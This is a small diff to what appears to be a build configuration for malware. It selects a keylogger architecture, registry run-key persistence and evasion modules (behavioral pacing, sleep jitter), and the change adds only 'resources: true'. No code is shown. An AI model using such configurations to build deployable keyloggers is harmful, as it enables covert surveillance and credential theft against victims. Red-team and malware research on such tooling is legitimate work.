@@ -18,6 +18,8 @@ arch: arch/keylogger
 
 persist: persist/registry_run
 
+resources: true
+
 evasion:
   - evasion/behavioral_pacing
   - evasion/sleep_jitter
